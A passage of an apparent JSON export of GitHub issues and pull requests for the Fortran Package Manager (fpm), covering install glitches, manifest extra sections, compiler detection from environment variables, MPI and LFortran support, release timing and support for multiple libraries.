mkdir -p glitches/app\n + mkdir -p glitches/test\n + git init glitches\nInitialized empty Git repository in /home/urbanjs/venus/V600/github/fpm-tools/tools/fcmd/glitches/glitches/.git/\n+ cd glitches\n+ fpm build\n + mkdir -p build/dependencies\n + mkdir -p build/gfortran_2A42023B310FA28D/glitches\n + gfortran -c test/check.f90  ... -o build/gfortran_2A42023B310FA28D/glitches/test_check.f90.o\n + gfortran -c ././src/glitches.f90  ... -o build/gfortran_2A42023B310FA28D/glitches/src_glitches.f90.o\n + ar -rs build/gfortran_2A42023B310FA28D/glitches/libglitches.a build/gfortran_2A42023B310FA28D/glitches/src_glitches.f90.o\nar: creating build/gfortran_2A42023B310FA28D/glitches/libglitches.a\n + gfortran -c app/main.f90  ... -o build/gfortran_2A42023B310FA28D/glitches/app_main.f90.o\n + mkdir -p build/gfortran_2A42023B310FA28D/app/\n + gfortran   ... -o build/gfortran_2A42023B310FA28D/app/glitches\n + mkdir -p build/gfortran_2A42023B310FA28D/test/\n + gfortran   ... -o build/gfortran_2A42023B310FA28D/test/check\n+ fpm install\n# Update: build/gfortran_2A42023B310FA28D/app/glitches -> /home/urbanjs/venus/V600/.local/bin\n+ : 'make two programs'\n+ cp app/main.f90 app/glitches2.f90\n+ : 'builds and installs both'\n+ fpm install\n + gfortran -c app/glitches2.f90  ... -o build/gfortran_2A42023B310FA28D/glitches/app_glitches2.f90.o\n + gfortran   ... -o build/gfortran_2A42023B310FA28D/app/glitches2\n# Update: build/gfortran_2A42023B310FA28D/app/glitches -> /home/urbanjs/venus/V600/.local/bin\n# Update: build/gfortran_2A42023B310FA28D/app/glitches2 -> /home/urbanjs/venus/V600/.local/bin\n+ fpm run --list\n Matched names:\nglitches   glitches2  \n+ : 'now the glitches start'\n+ :\n+ : 'even though app/glitches2.f90 remains it is'\n+ : 'no longer installed if app/main.f90 is removed'\n+ rm app/main.f90\n+ fpm build\n+ fpm install\n<ERROR>Project does not contain any installable targets\nSTOP 1\n+ fpm run --list\n Matched names:\nglitches2  \n+ fpm install --list\n<ERROR>Project does not contain any installable targets\nSTOP 1\n+ : 'if there is no src/ directory it will not'\n+ : 'be built but it will be even if src/ is'\n+ : empty\n+ rm -rfv test src\n+ rm -rfv build\n+ fpm run --list\n<ERROR>*cmd_run*:package error:Neither library nor executable found, there is nothing to do\nSTOP 1\n+ fpm install --list\n<ERROR>Neither library nor executable found, there is nothing to do\nSTOP 1\nurbanjs@venus:~/github/fpm-tools/tools/fcmd/glitches$",
            "comments": []
        },
        {
            "number": 533,
            "user": "awvwgk",
            "date": "2021-08-04 17:54:58+00:00",
            "title": "Allow extra section in package manifest",
            "text": "Closes #430",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2021-08-05 07:32:56+00:00",
                    "text": "Is it possible to add a trivial example to the manifest-reference.md file?\nI do not mean to encourage people to use this section when it is not\nstrictly needed, but it might help organise their (or my :)) thoughts about\nits actual use.\n\nOp do 5 aug. 2021 om 02:37 schreef Brad Richardson ***@***.***\n\u2026\n:\n ***@***.**** approved this pull request.\n\n Seems reasonable to me. I'll be curious to see what people do with it.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#533 (review)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7WZWRFLFGXKPKI34TT3HMK7ANCNFSM5BRVRI6Q>\n .\n Triage notifications on the go with GitHub Mobile for iOS\n <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n or Android\n <https://play.google.com/store/apps/details?id=com.github.android&utm_campaign=notification-email>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-05 07:52:43+00:00",
                    "text": "I was thinking about having an example, but I don't want to raise the expectation that some tool actually supports this already.\nSo here is a hypothetical table for the findent tool:\n[extra.findent]\nstart-indent = 0         # <n>: starting     indent (default: 0)                      \nindent = 4               # <n>: all          indents (default: 3)\nindent-associate = 4     # <n>: ASSOCIATE    indent (default: all)\nindent-block = 4         # <n>: BLOCK        indent (default: all)\nindent-do = 4            # <n>: DO           indent (default: all)\nindent-if = 4            # <n>: IF           indent (default: all)\nindent-enum = 4          # <n>: ENUM         indent (default: all)\nindent-forall = 4        # <n>: FORALL       indent (default: all)\nindent-interface = 4     # <n>: INTERFACE    indent (default: all)\nindent-module = 4        # <n>: MODULE       indent (default: all)\nindent-procedure = 4     # <n>: FUNCTION, SUBROUTINE and PROGRAM indent (default: all)\nindent-select = 4        # <n>: SELECT       indent (default: all)\nindent-type = 4          # <n>: TYPE         indent (default: all)\nindent-where = 4         # <n>: WHERE        indent (default: all)\nindent-critical = 4      # <n>: CRITICAL     indent (default: all)\nindent-changeteam = 4    # <n>: CHANGE TEAM  indent (default(all)\nindent-continuation = 4  # <n>: continuation indent except for lines starting with '&' free to free only\nindent-case = -2         # <n>: CASE         indent (default: -all/2)\nindent-contains = -2     # <n>: CONTAINS     indent (default: -all/2)\nindent-entry = -2        # <n>: ENTRY        indent (default: -all/2)\nOr a hypothetical configuration for fpm-search adding registries for the current project\n[extra.fpm.search]\nlabel1 = \"https://my-alternate-registry/index.json\"\nlabel2 = \"https://other-registry/index.json\""
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-08-06 06:31:02+00:00",
                    "text": "Okay, thanks - when it is clearly documented that it is simply an example\nfor some hypothetical package/tool/..., it should not raise expectations\nbeyond the possibility that it may be useful for some actual\npackage/tool/... But the examples you give are useful in my opinion.\n\nOp do 5 aug. 2021 om 09:52 schreef Sebastian Ehlert <\n***@***.***>:\n\u2026\n I was thinking about having an example, but I don't want to raise the\n expectation that some tool actually supports this already.\n\n So here is a hypothetical table for the findent\n <https://sourceforge.net/projects/findent/> tool:\n\n [extra.findent]start-indent = 0         # <n>: starting     indent (default: 0)                      indent = 4               # <n>: all          indents (default: 3)indent-associate = 4     # <n>: ASSOCIATE    indent (default: all)indent-block = 4         # <n>: BLOCK        indent (default: all)indent-do = 4            # <n>: DO           indent (default: all)indent-if = 4            # <n>: IF           indent (default: all)indent-enum = 4          # <n>: ENUM         indent (default: all)indent-forall = 4        # <n>: FORALL       indent (default: all)indent-interface = 4     # <n>: INTERFACE    indent (default: all)indent-module = 4        # <n>: MODULE       indent (default: all)indent-procedure = 4     # <n>: FUNCTION, SUBROUTINE and PROGRAM indent (default: all)indent-select = 4        # <n>: SELECT       indent (default: all)indent-type = 4          # <n>: TYPE         indent (default: all)indent-where = 4         # <n>: WHERE        indent (default: all)indent-critical = 4      # <n>: CRITICAL     indent (default: all)indent-changeteam = 4    # <n>: CHANGE TEAM  indent (default(all)indent-continuation = 4  # <n>: continuation indent except for lines starting with '&' free to free onlyindent-case = -2         # <n>: CASE         indent (default: -all/2)indent-contains = -2     # <n>: CONTAINS     indent (default: -all/2)indent-entry = -2        # <n>: ENTRY        indent (default: -all/2)\n\n Or a hypothetical configuration for fpm-search\n <https://github.com/brocolis/fpm-search> adding registries for the\n current project\n\n [extra.fpm.search]label1 = \"https://my-alternate-registry/index.json\"label2 = \"https://other-registry/index.json\"\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#533 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRYUDOKURRESJZGSAFLT3I7NLANCNFSM5BRVRI6Q>\n .\n Triage notifications on the go with GitHub Mobile for iOS\n <https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>\n or Android\n <https://play.google.com/store/apps/details?id=com.github.android&utm_campaign=notification-email>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2021-08-09 16:09:12+00:00",
                    "text": "Thanks Sebastian @awvwgk, LGTM \ud83d\udc4d With two approvals and myself, I'll now merge."
                }
            ]
        },
        {
            "number": 532,
            "user": "awvwgk",
            "date": "2021-08-03 13:03:08+00:00",
            "title": "Dependency graphs in developer documentation",
            "text": "See https://fortran-lang.discourse.group/t/1626/3\nWe currently do not create dependency graphs in the generated FORD documentation. One reason for not enabling the graphs was that they can become huge and we check in the documentation in our repository, which produces needlessly large diffs on the gh-pages branch.\ncc @aslozada",
            "comments": []
        },
        {
            "number": 529,
            "user": "awvwgk",
            "date": "2021-07-31 10:56:39+00:00",
            "title": "Detect compilers from environment variables",
            "text": "Build systems like CMake and meson can read the compiler from the FC and CC environment variables or detect the archiver from the AR environment variable. Similarly the FFLAGS and CFLAGS variables can be used to pass flags for the compilation.\nFor example, below are environment variables usually set in a conda-build process:\nADDR2LINE=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-addr2line\nAR=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-ar\nAS=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-as\nCXXFILT=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-c++filt\nCC=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-cc\nCFLAGS=-march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -isystem $PREFIX/include -fdebug-prefix-map=$SRC_DIR=/usr/local/src/conda/fpm-0.3.0 -fdebug-prefix-map=$PREFIX=/usr/local/src/conda-prefix\nCPPFLAGS=-DNDEBUG -D_FORTIFY_SOURCE=2 -O2 -isystem $PREFIX/include\nCPP=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-cpp\n# ...\nLDFLAGS=-Wl,-O2 -Wl,--sort-common -Wl,--as-needed -Wl,-z,relro -Wl,-z,now -Wl,--disable-new-dtags -Wl,--gc-sections -Wl,-rpath,$PREFIX/lib -Wl,-rpath-link,$PREFIX/lib -L$PREFIX/lib\nINFO: activate-gfortran_linux-64.sh made the following environmental changes:\nF77=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-gfortran\nF90=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-gfortran\nF95=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-f95\nFC=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-gfortran\nFFLAGS=-fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -isystem $PREFIX/include -fdebug-prefix-map=$SRC_DIR=/usr/local/src/conda/fpm-0.3.0 -fdebug-prefix-map=$PREFIX=/usr/local/src/conda-prefix\nFORTRANFLAGS=-fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -isystem $PREFIX/include -fdebug-prefix-map=$SRC_DIR=/usr/local/src/conda/fpm-0.3.0 -fdebug-prefix-map=$PREFIX=/usr/local/src/conda-prefix\nGFORTRAN=$BUILD_PREFIX/bin/x86_64-conda-linux-gnu-gfortran\nAutomatically picking up some of this information would reduce the packaging of any fpm project for conda to just:\nfpm install --prefix $PREFIX",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-31 22:09:12+00:00",
                    "text": "In an early PR that got pulled  this was done and the consensus at the time was that using environment variables extensively went against making a reproducible package and that this would be better done in the fpm.toml file and subsequently via the --profile flag. That will hopefully occur soon; and there were a number of issues including whether the FC variable could include full pathnames and how that would be handled.  Hopefully, custom --profile is not far off.\nBut instead of applying those environment options unconditionally when present what if there were a \"compiler\" name that set all it's values from the variables?   fpm --compiler env perhaps?\nPS; could not find the earlier discussions ( I was the one that orginally had it reading the variables) but there were discussions about issues  like inadvertently picking up options, how different compilers needed different values anyway, and how someone could not as easily reproduce someone else's build, and how since a unique directory is built for each combination of options fpm is aware of you would either have to take the variables into account when determining the build directory name or someone could make a build that was a mixture of build options with no easy way to reproduce or record that.\nThose are the ones I remember  (the original introduction of alternate compilers to the Fortran version allowed for the variables to be used and introduced --flag and --cflag and a few others, but those options were rejected at the time).\nAlso note there are differences between what Make and Cmake and other utilities do with the same variable names and what the contents are allowed to be, those variables are a de-facto standard mostly derived from common make and gmake usage (and those are not always compatible either), so the question arises whether there should be FPM_* versions of the variables.  Note several compilers have their own variables as well, so even now you can set compiler options via config files and environment variables when using ifort (for example) that fpm is unaware of and so does not make a new build subdirectory for. Whether that is a feature or a flaw depends on the results."
                }
            ]
        },
        {
            "number": 528,
            "user": "urbanjost",
            "date": "2021-07-30 17:57:04+00:00",
            "title": "proposal to close #525 by generating build/.gitignore",
            "text": "Seems like #525 is reasonable; it does put a few lines that are git(1)specific into fpm, but is does not make it dependent on the .gitignore file (that is, someone not using git(1) is not affected); and is more reliable at ensuring build/ is ignored which is very dominantly the case.  Any up or down votes on this simple change?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-04 19:26:10+00:00",
                    "text": "Thanks, John. I'll go ahead and merge this patch."
                }
            ]
        },
        {
            "number": 527,
            "user": "awvwgk",
            "date": "2021-07-30 16:27:08+00:00",
            "title": "Add objects for handling compiler and archiver",
            "text": "Adds some abstraction for the compiler and archiver to remove the logic from the backend.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-07-30 23:14:02+00:00",
                    "text": "This partly addresses #354 by allowing to detect the compiler command inside an MPI wrapper."
                },
                {
                    "user": "certik",
                    "date": "2021-07-31 10:06:31+00:00",
                    "text": "I am not very good with fpm internals yet. Are you looking for a thorough review? I would be able to do it next week. Feel free to merge if somebody else can do a better job sooner."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-31 10:08:09+00:00",
                    "text": "I'm currently more looking for feedback on the preliminary MPI support. Just pinged you and Milan, since you were involved in #354. Let me know if you can break it."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-31 13:22:31+00:00",
                    "text": "Thanks for starting this Sebastian.\n\nI am not very good with fpm internals yet. Are you looking for a thorough review?\n\nI might be a better reviewer to request for changes to the model and backend. This generally all looks good as per your previous PR and this is definitely the direction we want to go with the backend.\nHowever I think the timing may be a little unfortunate here; I'm concerned that this overlaps significantly with Jakub's work in #498. Given the stage that Jakub is at with his project and with only a few weeks left, can we hold off on this until Jakub has finished? I'm confident that you'll be able to pick it up once #498 is completed, but I don't think the other way around would be fair if that makes sense?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-31 13:43:13+00:00",
                    "text": "I did a check against Jakub's PR earlier, there is some overlap, in the sense that we will probably run into a merge conflict in src/fpm.f90, but the changes are similar if not identical in intent (like the build_name removal from the CLI module) and should be straight-forward to resolve. Otherwise the two patches are orthogonal enough to move forward separately.\nThere are some issues I encountered in the backend, which require fixing at some point (like -I flag for all compilers while Intel on Windows would require /I), but I didn't touched those yet as they would definitely collide with Jakub's work."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 16:11:32+00:00",
                    "text": "I tested this PR with LFortran and I can confirm that it works. Thank you @awvwgk. It seems to still work with gfortran.\nWhat else is needed to get this merged?"
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 16:14:21+00:00",
                    "text": "After this is merged in master and a package in Conda, I plan to set this up at LFortran's CI on all platforms, so that we can test that simple projects work everywhere. So for LFortran's development it would be very good to get this merged. We can help Jakub to resolve conflicts in his PRs."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-23 16:16:45+00:00",
                    "text": "It's mainly a refactor with some straight-forward feature additions (MPI support and now also LFortran support). I'm still hoping for feedback on the initial MPI support before starting with the actual review of the refactoring."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 16:22:39+00:00",
                    "text": "How can I test the MPI support? I am happy to test."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-23 16:28:15+00:00",
                    "text": "How can I test the MPI support? I am happy to test.\n\nJust set --compiler mpifort or whatever and add\nbuild.external-modules = [\"mpi\", \"mpi_f08\"]\nto the package manifest and you should be ready to go.\nRunning executables/tests requires to the --runner argument with mpiexec or mpirun to work or you get the sequential version."
                },
                {
                    "user": "certik",
                    "date": "2021-08-25 02:35:03+00:00",
                    "text": "Do you know if there is a way to install mpi using Conda on macOS? I tried to install the packages mpi, openmpi, but none of them provide mpirun or mpiexec.\nI also tried spack but openmpi requires Fortran, and spack couldn't find Fortran. Installing gfortran using spack fails: spack/spack#25598."
                },
                {
                    "user": "certik",
                    "date": "2021-08-25 14:59:22+00:00",
                    "text": "@awvwgk, @LKedward, @milancurcic. This PR is of utmost importance for LFortran as it makes fpm working with LFortran. We want to release LFortran's MVP before FortranCon. For that, we need fpm and LFortran to work really well together. I need to setup a CI infrastructure on all platforms (Linux, macOS, Windows) and ensure things work with fpm. So I need an fpm release in Conda. I want to update our documentation etc. So I need at least  2 weeks before FortranCon, and time to get this all setup.\nSo I would like to get this PR merged as soon as possible and make an fpm release. It's a blocker for me.\nWhat do we need to do to merge this? It seems to me this is good enough to merge, and we can improve upon it in master."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-08-25 15:04:16+00:00",
                    "text": "I will test this now. Sorry for the delay."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-08-25 15:19:27+00:00",
                    "text": "It seems to work well:\n$ cat fpm.toml \nname = \"test-mpi\"\nversion = \"0.1.0\"\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"Copyright 2021, Jane Doe\"\n\n[build]\nexternal-modules = [\"mpi\"]\n$ cat app/main.f90 \nprogram test_mpi\n  use mpi\n  integer :: ierr, num_procs, this_proc\n  call mpi_init(ierr)\n  call mpi_comm_rank(MPI_COMM_WORLD, this_proc, ierr)\n  call mpi_comm_size(MPI_COMM_WORLD, num_procs, ierr)\n  print '(2(a,i2))', 'Hello from MPI process', this_proc, ' of ', num_procs\n  call mpi_finalize(ierr)\nend program test_mpi\n\n$ fpm_mpi run --compiler mpif90 --runner \"mpiexec -n 6\"\nHello from MPI process 1 of  6\nHello from MPI process 2 of  6\nHello from MPI process 3 of  6\nHello from MPI process 4 of  6\nHello from MPI process 0 of  6\nHello from MPI process 5 of  6\n\nI only skimmed through the code changes, but no thorough review. I'm not very familiar with the backend, but I trust @awvwgk with that.\nI also recommend going forward with this in interest of time for LFortran, and then work on resolving any conflicts when @kubajj's PR is ready."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-25 19:43:34+00:00",
                    "text": "Thanks a lot for the swift review. I'll go ahead and merge now, in case anything breaks I'll be around to help fixing it again ;)."
                },
                {
                    "user": "certik",
                    "date": "2021-08-25 23:03:28+00:00",
                    "text": "Thank you! Let's test this for a while and maybe do a release on Friday? So that it gets into Conda.\nI am making progress on compiling fpm examples with LFortran: https://gitlab.com/lfortran/lfortran/-/issues/540"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 07:55:05+00:00",
                    "text": "Thank you! Let's test this for a while and maybe do a release on Friday? So that it gets into Conda.\n\nNo, I don't think this is a good point to create an fpm release. I'd like to have the compiler profiles ready before the next fpm release. Also, I think the partial LFortran support in fpm would do more harm than good if the LFortran version on conda doesn't work yet (see #545). We can of course coordinate the next LFortran and fpm release.\nIf you want to have an installable fpm version for CI testing we can possibly come up with something workable here."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-08-26 12:35:10+00:00",
                    "text": "Though I understand, and don't disagree with, @awvwgk's position, I do recommend releasing early and more often, even if some things are broken. It's okay. They're supposed be broken in alpha. Releasing early and often keeps engagement and excitement about fpm going. One more thing for people to talk about and share. Last release was 2 months ago.\nI can't comment on when exactly to release this as it's likely not be me doing it. :)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 13:00:27+00:00",
                    "text": "Fair point, we can talk about releasing in the next weeks if we have enough features together and whether we aim with the profiler profiles for this version or the next one.\nAt least from my side, it won't happen tomorrow. I think Laurence is away and I'm at a conference with limited availability next week as well. I just think this is not a good point to make a release."
                },
                {
                    "user": "certik",
                    "date": "2021-08-26 17:06:39+00:00",
                    "text": "As far as fpm is concerned, it calls LFortran using the API that is described in the document updated in this PR. It is LFortran's job to deliver. The master of LFortran works, and we can release anytime. I am happy to release today if you need an LFortran release first.\nRegarding an fpm release, I want things to work by FortranCon on September 23. Realistically, I want everything in Conda at least 2 weeks before, working on all platforms (as far as we know), so that people can test it out and report bugs and we can fix it. So both LFortran and fpm has to work in Conda by Sunday September 5. As I mentioned above, I need about a week before that to ensure our CI works and to fix up any issues which I expect there will be especially on Windows. So I need the first fpm Conda package by Sunday August 29. This particular weekend I'll be busy, so I want to release fpm this Friday. Any later than that and it's going to be really tough time wise.\nI volunteer to do the fpm release. Is it documented somewhere how to do that? If not, I will do my best.\nAs @milancurcic said, we need to be releasing early and often. I 100% agree with that. The main advantage is that you don't have to \"possibly come up with something workable here.\". We just do the release. That's it. Otherwise it is more work not just for you, but for me also --- getting the CI working on all platforms is a lot of work (for example by installing gfortran on Windows first and compiling fpm from source, the same on macOS, and then uninstalling gfortran to ensure cmake only finds LFortran to compile our tests, etc. --- a lot of possible bugs to be worried about), and then I have to redo it with the official Conda fpm release. It is truly more work for everybody. If, on the other hand, we release often, then I simply set it up once. Updating a version from the same conda-forge repository is then easy.\nIt is in the benefit of everybody for LFortran and fpm to work well together, and the above approach is the easiest how to get there. Furthermore, I need a build system on Windows that works, and I can't get cmake to work with LFortran. I need this just for LFortran to ensure that things work well on Windows. Fpm turned out to be the easiest way to get there."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 18:20:41+00:00",
                    "text": "Allright then, I went ahead and opened #546 for a version bump."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 18:41:55+00:00",
                    "text": "@certik I see that this is an important and urgent issue for you, therefore let's just go ahead and make this release. Sorry for holding this back earlier.\nI'm currently just a bit short of time and have a lot of other things that require my attention as well. I'll try to get my head free and look into the expected issues with the conda-forge build, but I can't make any promises, unfortunately."
                },
                {
                    "user": "certik",
                    "date": "2021-08-26 20:03:01+00:00",
                    "text": "Thanks a lot for this!\nI'll help with Conda builds of fpm. This is the work that makes sense for me to do, as I need it, and fpm needs it, long term. Let's worry about it after we release. We can easily add patches in the code package if we need to modify anything in fpm, I've done it for LFortran many times. The patch then gets incorporated into the next upstream release."
                }
            ]
        },
        {
            "number": 526,
            "user": "rouson",
            "date": "2021-07-28 23:21:31+00:00",
            "title": "Establish a decision-making process",
            "text": "I love the broad community support for fpm.  The vibrant discussion around issue #363, which was posted about 5 months ago, makes me wonder whether a documented decision-making process could bring some finality to such great discussions.  Is there some obvious way to tally votes?  Are there regular phone calls during which decisions could be made in order to impose a natural timeline?  One of the many impressive things about fpm is the speed with which the community embraced and (re)wrote it.  I think fpm would benefit if someone could bring that same level of agility to deciding about submitted ideas.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-07-31 13:28:20+00:00",
                    "text": "Thanks Damian @rouson, I agree. At our last monthly meeting we discussed formalising the maintainer roles for all Fortran-lang projects and this will likely involve some leadership with regards to project decisions and future direction. Keep an eye out for a future update on this."
                }
            ]
        },
        {
            "number": 525,
            "user": "awvwgk",
            "date": "2021-07-28 12:08:44+00:00",
            "title": "Automatically create gitignore for build artifacts",
            "text": "Build systems like meson put a .gitignore in the build directory to avoid accidentally committing in the repository.\n# This file is autogenerated by Meson. If you change or delete it, it won't be recreated.\n*\n\nFpm could also put a .gitignore in the build directory with just * to avoid committing any build artifacts.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-28 23:36:29+00:00",
                    "text": "An fpm new subcommand makes a .gitignore with the line 'build/*' in it, but I do like your suggestion.  I think the gitignore in the build/ directory makes perfect sense, as everything in there is generated by fpm. The only hesitation might be that if someone is using git(1) for more than just generating a standard fpm directory, they might actually WANT to push or pull the entire directory, perhaps to a mirror in their own organization, for example. Perhaps only making it when the build/ directory is created is OK, and not checking for it at each execution (which I think is what you were suggesting anyway) is OK, especially since not everyone initializes a package with new but just creates it manually or some other way; but I would like a line mentioning that somewhere in the user guide saying you need to delete it in that case.  I think it is desirable such a high percentage of the time that it does not need a .command switch on fpm itself.  Would we then get rid of the one generated in the top of the package curr i ently by new?  I think I would, as it would be redundant and could just lead to confusion and it is neater if everything generated by fpm is in the build directory whenever possible. What does Meson do for hg or other packages? Would you just make a .hgignore as well, or only make a .gitignore if you saw a .git directory, and/or a .hgignore if you saw a .hg/ directory?\nCurrently, we just pre-suppose git(1) is being used, and even expect it if you want to use dependencies; but other package managers  allow any or a list of other packages to be used.  Will we always pre-suppose git(1) is being used?"
                }
            ]
        },
        {
            "number": 524,
            "user": "bcornille",
            "date": "2021-07-23 02:31:19+00:00",
            "title": "Multiple libraries in a package",
            "text": "Would it be possible to extend the package_config_t to create multiple libraries? This is useful when you have multiple executables which have some common module dependencies and others distinct. These internal libraries could also depend on others. Presumably this would affect the TOML specification and library_config_t.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-07-26 09:56:02+00:00",
                    "text": "We are currently not planning to support multiple library targets in a project. It doesn't mean you can't create your described setup with fpm. There are two options here:\n\nyou have modules that are shared between executables, examples or tests, than those can be placed inside the respective directory (app, example or test) and are automatically shared between the different targets. Those files won't be available for downstream projects which depend on your project.\nyou can setup multiple fpm projects to implement the respective features in separate libraries and reuse them to build your application. In case you can setup your project more modular this is the preferred way, as all libraries can be reused individually."
                },
                {
                    "user": "bcornille",
                    "date": "2021-07-26 14:20:21+00:00",
                    "text": "What is the rationale for only supporting a single library target in a project?"
                },
                {
                    "user": "rouson",
                    "date": "2021-10-26 04:02:40+00:00",
                    "text": "I too am curious about the rationale for only supporting a single library target.  @awvwgk is item 2 in your comment the answer?  Setting up separate projects for this purpose seems like heavy lift -- especially if \"separate project\" means separate repositories, which then means separate documentation, separate unit tests, separate CI tests, etc.  Furthermore, does the statement \"all libraries can be reused individually\" imply that there are no dependencies between libraries?  If there are dependencies between the various libraries that a project builds, then it makes sense to keep them in one project. Even when there are no dependencies, it can make sense to keep them together if each serves a common purposes, e.g., each supports one interface in a different way."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-26 08:33:27+00:00",
                    "text": "It is a deliberate design decision, think of it as a way to limit the complexity of a project and also the required knowledge when using a project as dependency.\nIs there a specific case you want to realize with fpm requiring the creation of a mono-repository with multiple projects?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-10-26 09:20:38+00:00",
                    "text": "... which then means separate documentation, separate unit tests, separate CI tests, etc.\n\nI think this is a good thing. If anything I want more modularity with regards to testing and documentation to make clear the compartmentalisation of functionality and interfaces between different libraries.\nI find this makes writing tests easier for developers and reading documentation easier for users compared to when dealing with large mono-repos.\n\nFurthermore, does the statement \"all libraries can be reused individually\" imply that there are no dependencies between libraries?\n\nNot at all, rather I think it comes back to modularity again. If A depends on B unidirectionally, then B can still be reused without need for A.\nAs Sebastian has stated above, I'm not aware that fpm actually restricts any of the use cases described above.\nI too would be interested to hear more about a specific use case where fpm is currently not well-suited."
                },
                {
                    "user": "bcornille",
                    "date": "2021-10-26 12:40:54+00:00",
                    "text": "I work on a project that has several orthogonal libraries that exist in the same repository. There is also a small hierarchy of interdependency. This way we have testing for each library independently. We build applications that depend on all libraries and some utilities that depend on subsets. Splitting the libraries into separate repositories would increase maintenance burden since each is on the smaller side and there are a few. The other option of combining everything into one library violates the principle of separate concerns.\nSince fpm is opinionated in this way it precludes consideration for adoption. Even if our setup is viewed as bad practice, it is not going to change. In my opinion, if it is not a severe technical limitation, this is a unnecessary stance for fpm to take and is unsymmetric with it's support for multiple apps in one project."
                },
                {
                    "user": "rouson",
                    "date": "2021-10-26 20:29:42+00:00",
                    "text": "I'm working with collaborators on a possible successor to OpenCoarrays, which is written primarily in C.  The successor will be written as much as possible in Fortran and is already using fpm to build.  Having multiple libraries that support one interface is one of the central aims of OpenCoarrays and its successor.  The unified interface is what makes the different libraries swappable so parallel Fortran 2018 source code can be compiled into an object file once and then linked or relinked to any one of several backends, e.g., one that supports communication via MPI, another that supports communication via OpenSHMEM, etc.  Splitting OpenCoarrays into separate projects would violate the basic purpose of the OpenCoarrays project in addition to adding all the previously mentioned burdens of maintaining separate repositories with multiple copies of the very same CI tests, documentation, Wiki, etc."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-26 20:43:19+00:00",
                    "text": "Thanks for the insights, those sound like valid use cases. Let's discuss how we can make this possible (cc @fortran-lang/fpm).\n\nLet's explore how we could make this possible in the package manifest.\nProposal\n1. Special syntax for a single executable:\nThe executable array of tables with a single executable is currently given as:\nname = \"lib\"\n\n[[executable]]\nname = \"lib\"\nsource-dir = \"app\"\nA possible equivalent syntax for a project with a single executable with the same name as the project could be:\nname = \"lib\"\n\n[executable]\nsource-dir = \"app\"\n2. New syntax for multiple libraries\nThe current syntax for the library table:\nname = \"lib\"\n\n[library]\nsource-dir = \"src\"\nThis could also be expressed as an array with a single table using the project name:\nname = \"lib\"\n\n[[library]]\nname = \"lib\"\nsource-dir = \"src\"\nWith this change we can keep the current package manifest syntax and easily make multiple libraries available."
                },
                {
                    "user": "rouson",
                    "date": "2021-10-27 02:57:45+00:00",
                    "text": "@awvwgk thanks for considering this.  I'm a minimalist so I generally put everything in default locations and most of my fpm manifests are 5-10 lines.   Therefore I'm not very familiar with any of the syntax above and have no opinion other than that backward compatibility is one of the main reasons Fortran has survived ~64 years.  Learning from that lesson, I think doing something that preserves the current package manifest syntax is a great thing."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-27 10:56:09+00:00",
                    "text": "The other issue is handling project with multiple libraries.\nFor now we could require explicit declaration of all libraries in a project, the directory trees of two libraries must not overlap, i.e. a library source-dir cannot be a subdirectory of another library source-dir.\nFor projects with a dependency providing multiple libraries we can start by assuming all will be made available by default. Than we need additional syntax to narrow the available libraries (suggestions?)."
                },
                {
                    "user": "certik",
                    "date": "2021-10-27 14:26:12+00:00",
